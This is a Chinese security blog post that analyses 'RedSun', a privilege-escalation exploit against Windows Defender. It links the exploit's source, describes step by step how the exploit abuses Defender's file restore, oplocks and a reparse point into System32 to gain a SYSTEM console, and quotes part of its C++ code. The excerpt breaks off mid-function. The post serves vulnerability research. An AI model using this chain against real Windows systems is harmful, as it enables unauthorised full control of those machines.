---
title: Windows Defender 漏洞 - RedSun EXP 详细分析
url: https://mp.weixin.qq.com/s/1mJfEnzqA908kuTntG0sww
source: Doonsec's feed
date: 2026-04-18
fetch_date: 2026-04-19T04:47:15.817510
---

# Windows Defender 漏洞 - RedSun EXP 详细分析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1pic87O41XF7GAqGHVk1qv6960kSeAHHxzU0kwIIcHDkSibKAQU6BmG6oBWgr8vAqkZSmnt93cbwc6iabHCGKCeNYEVRX5gaPicum2wcjFcKXias/0?wx_fmt=jpeg)

# Windows Defender 漏洞 - RedSun EXP 详细分析

原创

Re
Re

蜂鸟安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

**0****1**

**免责声明**

Hbird Security - 蜂鸟安全

本文所涉及的技术、思路和工具仅用于安全测试和防御研究，严禁将其用于非法入侵或其它攻击他人系统以及盈利等目的，一切后果由操作者自行承担。

**0****1**

**目录**

Hbird Security - 蜂鸟安全

* 漏洞成因
* 整体执行流程
* EXP 代码分析

+ ### 函数 - DestroyVSSNamesList()
+ ### 函数 - RetrieveCurrentVSSList()
+ ### 函数 - ShadowCopyFinderThread()
+ ### 函数 - rev()
+ ### 函数 - DoCloudStuff()
+ ### 函数 - LaunchConsoleInSessionId()
+ ### 函数 - IsRunningAsLocalSystem()
+ ### 函数 - LaunchTierManagementEng()

+ ### 小结

* ### 总结

###

**0****1**

**漏洞成因**

Hbird Security - 蜂鸟安全

Defender 有个云端判断机制。当它扫描到一个可疑文件时，会给文件打上 "cloud tag" 云标签。因为 Defender 的某种恢复逻辑，Defender 会尝试把文件恢复到它的原始路径。攻击者通过构造一个带有云标签的恶意文件，利用 Windows 的文件锁竞争（Oplock）、目录重定向等特性把原路径重定向到 System32 目录下，当 Defender 试图恢复文件时，把恶意文件恢复到 System32 目录。

**EXP****下载地址：**

```
https://github.com/Nightmare-Eclipse/RedSun
```

**0****2**

**整体执行流程**

Hbird Security - 蜂鸟安全

1. 创建命名管道 REDSUN，该管道将被 LaunchConsoleInSessionId() 中的客户端连接，以获取用户会话 ID，从而在 SYSTEM 账号下弹出控制台。

![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF7aLjUnjSVtkDYHoMvr6OAEfWhR0SgnvbEibvNPghNHTngmvElYNAPMcT7OTsuqLudOA8EQGTRNQwUD90vWVWzU8azntMTGNfM4/640?wx_fmt=png&from=appmsg)

2. 启动监控线程 ShadowCopyFinderThread，监控新卷影副本，找到文件后锁住文件

![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF7z4r8u56ljQCwWxUvA4QOyuJYYfj3nxdfq0LL2lfPFRE24ukkSQiaEPnZkz4N6M1DXAYOteTnmTKdMB9aqaPJoPZia0f0Xlskicc/640?wx_fmt=png&from=appmsg)

3. 在 %TEMP% 下创建随机工作目录，目录形如 C:\Users\xxx\AppData\Local\Temp\RS-{GUID}，在该目录下创建伪装文件 TieringEngineService.exe

![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF6yWcqhSCYGVg0BUSmkOiaLTFjCmIcoXXHNALdabF9MXtq5OZxwzia3oBBHh9jOU3LJOhrcoDdZ4BmKHnCkaKm8ibrXqPVaxLkfbA/640?wx_fmt=png&from=appmsg)

4. 向 TieringEngineService.exe 写入 EICAR 测试病毒字符串，用于故意触发 Defender 扫描和删除

![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF6YEu8n5jWpqWHfTgFnueBicL2oX2znKxchIrsialY29FicCGn9vxDsiaP6icm3wsaPozZUNSSxjMBPOZg5EYEXxwYFcBKUxK9Lu7yU/640?wx_fmt=png&from=appmsg)

5. 标记文件待删除，调用 DoCloudStuff 将工作目录注册为云同步根，并将该文件转换为云占位符

![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF630uAUkMMUWv6mur1MrLUic3C1lz8zAodDsK1V04z995aOlVrK5W5cibp8XjK9ic51ibBWLlOyXY20yzHyGFIBPcRFO4rZmPGN1yw/640?wx_fmt=png&from=appmsg)

6. 将原来的工作目录重命名为 {GUID}.TMP，再重新创建原目录，然后用 NtCreateFile 以 FILE\_SUPERSEDE 方式重新创建该文件

![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF69pQpIujYKdwjpmv8eRQZcsibdIiaiaTRsicIiaBSSAuDL1EUicINOD2h66Y1Klrp8BC1ZJZz4kNQdkCEQsWOr9ku05S5FkWt0Ot6wU/640?wx_fmt=png&from=appmsg)

7. 再次对文件加 Batch Oplock 并映射内存，这里主线程加的锁和另一个线程加上操作是一样的，申请的都是同类型的锁，但是目的不同

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1pic87O41XF64zQVOpkZUfAQryAXYdzbQx3MymGeiczjSVCAzNxjC0SHub32UsDX2FkLcHqCJ7dMdR34k2HTnW2WAuj5IzRW8JcT8Mhiajp9D4/640?wx_fmt=png&from=appmsg)

8. 重命名这个再次创建的文件并再次标记删除，将文件重命名为 .TEMP2

![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF5aMGGwicTx1kicov8ypoJ4dukRpFqRzDpkRtj6HNmxIQVELNa3KT6ZDcMVNy7Dy2sfhPKZr2iaZ84JCLaicrOkTPg5PzdJ3BJc4Cc/640?wx_fmt=png&from=appmsg)

9. 打开工作目录并设置重解析点，以 FILE\_DIRECTORY\_FILE 打开目录，确保进程退出时目录被删除

![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF78F40neSPlIkKH5ULOGD7TJ5kVHmff7SDceqUKuJxVmFv0yQ53LOIQPNh03bdbSVbUM8UH8TfXibXBgibf07ibxvbjyTZYwaWZLU/640?wx_fmt=png&from=appmsg)

10. 构造 REPARSE\_DATA\_BUFFER，设置挂载点重解析点到 C:\\Windows\\System32，后续访问该目录时会被重定向到 System32 目录

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1pic87O41XF4OOmk2kvUaqTLjDdaOWzdvxc9lSww3c2QFh1uddVkYXRS3PC3dRmDcg1Y7ViaD0NCY8g7JUia43ZYMMJicvM7KsykuibM84P8pib5M/640?wx_fmt=png&from=appmsg)

11. 循环尝试覆盖 System32 下的同名文件

![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF6OcQ8CYuLKmxzH9cpCwrjbthECO8qqbJhwxG350P9aIppiblRib3H5HgdC0xmibvYxOTQ65fiaywINcicYd8liauUIoruScibOSmU4cU/640?wx_fmt=png&from=appmsg)

12. 将自身复制到 System32 并启动 COM 服务，如果成功，那么该程序是以 SYSTEM 权限启动，会以 SYSTEM 权限弹出一个控制台窗口

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1pic87O41XF7c8Uhl1RBaLG5uFBU0ibx5z59XyzyD10LUMM9RzupSZNTen8vftlJMHq7hyXzm7FtnRXibB4AtibfxpGnYuxa13bVzbqibCicpRWbg/640?wx_fmt=png&from=appmsg)

**bool****r = IsRunningAsLocalSystem();**的执行时间要提前于 main 函数，用来校验当前进程权限，所以第一次以普通权限运行 EXP 的时候并不会有控制台弹出。当然了让自定义函数提前与 main 函数执行，这个特性在 C++ 中才能实现，标准 C 语言是不行的。

![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF7KJ6alLPRo0zOj4ow5EtFugvlibz8ZCyta6yzmq4da3h5DOpgbKZSibLgcNwFjkLD75ROzwHwKthSjhOPvBiaIBrt2dRicd746bqo/640?wx_fmt=png&from=appmsg)

**0****3**

**EXP 代码分析**

Hbird Security - 蜂鸟安全

### **函数 - DestroyVSSNamesList()**

```
void DestroyVSSNamesList(LLShadowVolumeNames* First){    while (First)    {        free(First->name);        LLShadowVolumeNames* next = First->next;        free(First);        First = next;    }}
```

该函数是用来释放链表的，在这个 EXP 中使用链表来存储卷影信息，使用结束后调用这个函数释放链表。

### **函数 - RetrieveCurrentVSSList()**

```
LLShadowVolumeNames* RetrieveCurrentVSSList(HANDLE hobjdir, bool* criticalerr, int* vscnumber){    if (!criticalerr || !vscnumber)        return NULL;    *vscnumber = 0;    ULONG scanctx = 0;    // 分配查询缓冲区    ULONG reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);    ULONG retsz = 0;    OBJECT_DIRECTORY_INFORMATION* objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz); // objdirinfo 用来存储内核对象目录信息的缓冲区    if (!objdirinfo)    {        printf("Failed to allocate required buffer to query object manager directory.\n");        *criticalerr = true;        return NULL;    }    ZeroMemory(objdirinfo, reqsz);    NTSTATUS stat = STATUS_SUCCESS;    do    {        // 循环调用 _NtQueryDirectoryObject 枚举目录        stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, FALSE, &scanctx, &retsz);        if (stat == STATUS_SUCCESS)            break;        // 如果缓冲区不够大        else if (stat != STATUS_MORE_ENTRIES)        {            printf("NtQueryDirectoryObject failed with 0x%0.8X\n", stat);            *criticalerr = true;            return NULL;        }        // 重新分配更大的缓冲区        free(objdirinfo);        reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;        objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);        if (!objdirinfo)        {            printf("Failed to allocate required buffer to query object manager directory.\n");            *criticalerr = true;            return NULL;        }        ZeroMemory(objdirinfo, reqsz);    } while (1);    // 创建全 0 空内存块，用于判断列表结束    void* emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));    ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));    LLShadowVolumeNames* LLVSScurrent = NULL;    LLShadowVolumeNames* LLVSSfirst = NULL;    for (ULONG i = 0; i < ULONG_MAX; i++)    {        // 判断是否到了列表尾部        if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)        {            free(emptybuff);            break;        }        // 判断对象是否为 Device 类型        if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0)        {            wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };            if (objdirinfo[i].Name.Length >= sizeof(cmpstr))            {                // 判断是否为 HarddiskVolumeShadowCopy 卷影副本                if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)                {                    (*vscnumber)++; // 找到一个卷影副本，数量 +1                    // 链表存在，追加结点                    if (LLVSScurrent)                    {                        // 将名称存入链表                        LLVSScurrent->next = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));                        if (!LLVSScurrent->next)                        {                            printf("Failed to allocate memory.\n");                            *criticalerr = true;                            DestroyVSSNamesList(LLVSSfirst);                            return NULL;                        }                        ZeroMemory(LLVSScurrent->next, sizeof(LLShadowVolumeNames));                        LLVSScurrent = LLVSScurrent->next;                        LLVSScurrent->name = (wchar_t*)malloc(...